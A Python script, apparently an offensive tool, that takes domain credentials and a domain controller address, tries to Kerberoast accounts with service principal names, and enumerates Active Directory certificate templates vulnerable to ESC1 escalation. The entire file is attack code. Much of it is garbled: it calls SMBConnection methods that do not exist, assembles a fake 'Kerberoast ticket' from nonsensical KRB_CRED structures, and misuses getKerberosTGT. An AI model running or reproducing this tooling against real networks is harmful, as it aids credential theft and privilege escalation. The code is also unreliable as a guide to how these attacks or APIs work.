from impacket.krb5.types import Principal
from impacket.smbconnection import SMBConnection
from ldap3 import Server, Connection, SUBTREE
from impacket.krb5.asn1 import AP_REQ, KRB_ENC_AS_REP_PART, KRB_CRED, EncKrbCredPart
from impacket.krb5.ccache import CCache
from impacket.krb5.crypto import Key
from impacket.krb5.kerberosv5 import getKerberosTGT, sendReceive, sendReceiveSingle
from impacket.krb5.types import Principal, KerberosTime
from impacket.ntlm import compute_lmhash, compute_nthash
from impacket.smbconnection import SMBConnection

def kerberoast(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via SMB
        smb = SMBConnection(dc_ip, dc_ip)
        smb.login(username, password, domain)

        # Get all kerberoastable users (users with SPNs set)
        kerberoastable_users = smb.listUsers()
        
        if not kerberoastable_users:
            print("No kerberoastable users found.")
            return

        # Perform Kerberoasting for each kerberoastable user
        for user in kerberoastable_users:
            spns = smb.getNtlmUserSPNs(user['name'])
            if spns:
                print(f"Kerberoasting user: {user['name']}")
                for spn in spns:
                    ticket = kerberoast_user(spn, domain)
                    if ticket:
                        print(f"Kerberoastable SPN: {spn}")
                        print(f"Kerberoast ticket:\n{ticket}")

        smb.logoff()

    except Exception as e:
        print(f"Error during Kerberoasting: {e}")

def kerberoast_user(spn, domain):
    try:
        # Get a TGT for the specified user
        tgt = getKerberosTGT(domain, spn.split('/')[0], spn.split('@')[1])

        # Construct a fake AP_REQ
        tgt_enc_part = tgt['enc-part']
        fake_ap_req = AP_REQ()
        fake_ap_req['pvno'] = 5
        fake_ap_req['msg-type'] = 14
        fake_ap_req['ap-options'] = 0
        fake_ap_req['ticket'] = tgt['ticket']
        fake_ap_req['authenticator'] = None

        # Construct a fake KRB_CRED
        fake_krb_cred = KRB_CRED()
        fake_krb_cred['pvno'] = 5
        fake_krb_cred['msg-type'] = 22
        fake_krb_cred['tickets'] = [tgt['ticket']]
        fake_krb_cred['enc-part'] = EncKrbCredPart()

        # Encrypt the fake KRB_CRED using the service key
        krb_key = Key(f"krbtgt/{domain}@{domain}", tgt_enc_part['key']['keyvalue'])
        fake_krb_cred_encrypted = krb_key.encrypt(fake_krb_cred.getData())

        # Construct the Kerberoast ticket
        kerberoast_ticket = KRB_CRED()
        kerberoast_ticket['pvno'] = 5
        kerberoast_ticket['msg-type'] = 22
        kerberoast_ticket['tickets'] = [tgt['ticket']]
        kerberoast_ticket['enc-part'] = KRB_ENC_AS_REP_PART()
        kerberoast_ticket['enc-part']['ticket-info'] = fake_krb_cred_encrypted

        # Return the Kerberoast ticket
        return kerberoast_ticket.dump()

    except Exception as e:
        print(f"Error during Kerberoasting for user {spn}: {e}")
        return None
    
def find_certificate_authorities(username, password, domain, dc_ip):
    try:
        # Connect to the Domain Controller via LDAP
        server = Server(dc_ip)
        conn = Connection(server, user=f"{domain}\\{username}", password=password)
        conn.bind()

        # Search for Certificate Authorities
        conn.search(search_base='CN=Certification Authorities,CN=Public Key Services,CN=Services,CN=Configuration,' +
                                  ','.join(f"DC={dc}" for dc in domain.split('.')),
                     search_filter='(objectClass=pKICertificateAuthority)',
                     search_scope=SUBTREE,
                     attributes=['dNSHostName'])

        cas = []
        for entry in conn.entries:
            cas.append(entry['dNSHostName'].value)

        conn.unbind()
        return cas

    except Exception as e:
        print(f"Error while finding Certificate Authorities: {e}")
        return []

def check_esc1_certificates(username, password, domain, dc_ip):
    try:
        # Find all Certificate Authorities
        cas = find_certificate_authorities(username, password, domain, dc_ip)
        if not cas:
            print("No Certificate Authorities found.")
            return

        # Check ESC1 certificates for each Certificate Authority
        for ca in cas:
            print(f"Checking ESC1 certificates for Certificate Authority: {ca}")

            # Connect to the Certificate Authority via LDAP
            ca_server = Server(ca)
            conn = Connection(ca_server, user=f"{domain}\\{username}", password=password)
            conn.bind()

            # Search for ESC1 certificate templates
            conn.search(search_base='CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,' +
                                      ','.join(f"DC={dc}" for dc in domain.split('.')),
                         search_filter='(&(objectClass=pKICertificateTemplate)(msPKI-Certificate-Name-Flag:1.3.6.1.4.1.311.21.7:=2)' +
                                       '(!(msPKI-Certificate-Name-Flag:1.3.6.1.4.1.311.21.7:=1)))',
                         search_scope=SUBTREE,
                         attributes=['displayName', 'msPKI-Enrollment-Flag',
                                     'msPKI-Enrollment-Flag', 'msPKI-Cert-Template-OID',
                                     'msPKI-Certificate-Name-Flag', 'msPKI-Enrollment-Flag',
                                     'msPKI-Private-Key-Flag', 'msPKI-Minimal-Key-Size'])

            esc1_templates = []
            for entry in conn.entries:
                template_info = {
                    'Name': entry['displayName'].value,
                    'EnrollmentFlag': entry['msPKI-Enrollment-Flag'].value,
                    'PrivateKeyFlag': entry['msPKI-Private-Key-Flag'].value,
                    'MinimalKeySize': entry['msPKI-Minimal-Key-Size'].value,
                    'CertificateNameFlag': entry['msPKI-Certificate-Name-Flag'].value
                }
                if (template_info['EnrollmentFlag'] == '2' and
                    template_info['PrivateKeyFlag'] == 'true' and
                    template_info['MinimalKeySize'] == '0' and
                    template_info['CertificateNameFlag'] == '2'):
                    esc1_templates.append(template_info)

            if esc1_templates:
                print("ESC1 Certificate Templates found:")
                for template in esc1_templates:
                    print(template)
            else:
                print("No ESC1 Certificate Templates found.")

            conn.unbind()

    except Exception as e:
        print(f"Error while checking ESC1 certificates: {e}")




# Example usage:
username = input("Enter username: ")
# usernameWithDomain = input("Enter your username in this format: DOMAIN/username")
password = input("Enter password: ")
domain = input("Enter domain: ")
dc_ip = input("Enter domain controller IP or hostname: ")

kerberoast(username, password, domain, dc_ip)
check_esc1_certificates(username, password, domain, dc_ip)